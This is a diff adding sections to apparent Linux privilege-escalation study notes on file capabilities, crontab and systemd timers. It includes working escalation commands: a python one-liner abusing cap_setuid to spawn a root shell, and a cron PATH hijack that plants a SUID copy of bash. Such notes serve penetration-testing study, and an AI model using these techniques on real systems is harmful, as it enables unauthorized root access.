@@ -367,9 +367,85 @@ export -f /usr/sbin/service
 ```
 - run our privileged command/executable
 # Escalation Path: Capabilities
+## Summary
+Very similar to SUID's, but this is broken down to the kernel level. No need for sudo, etc. This is basically giving certain programs the ability to bypass all of the security checks put in place for regular users, basically allowing the program to run as `root`.
+## Enumeration
+- getcap
+```
+getcap -r / 2>/dev/null
+```
+## Exploitation
+### Example
+```
+# Enumerate Capabilities
+getcap -r / 2>/dev/null
+/usr/bin/python2.6 = cap_setuid+ep
+root@debian:~#
+
+# The important bit in the above result, is the `setuid+ep`, which stands for effective/permitted (permit everything)
+
+# Escalate
+/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+# Get's root shell
+```
+
 
 # Escalation Path: Scheduled Tasks
+## Crontab
+### Summary
+Most commonly known as a cron job or crontabs
+- See the cron table
+```
+cat /etc/crontab
+```
+- Example `crontab`
+```
+cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
 
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
+47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
+52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
+#
+```
+**Asterisks across the board - Scheduled task happens every minute**
+
+### Escalation via Cron Paths
+- Enumeration & Escalation
+We can use this when there is a cronjob that runs an executable or script that may be missing or mis-located.
+For example, if our path is:
+```
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+```
+and we have a `* * * * * root somescript.sh` in our crontab, we can look for that script in `/home/usr` (`ls -la /home/user`) and if it doesn't exist or we have read/write access to it, we can create our own somescript.sh that elevates our privilege.  
+For example:  
+```
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/somescript.bash
+chmod +x /home/user/somescript.bash
+```
+Then all we have to do is wait for the job to run. Using the script above, after it runs, we can `/tmp/bash -p` and we are now root.
+
+## [Systemd timers](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#scheduled-tasks)
+- enumeration
+```
+systemctl list-timers --all
+```
 # Escalation Path: NFS Root Squashing
 
 # Escalation Path: Docker
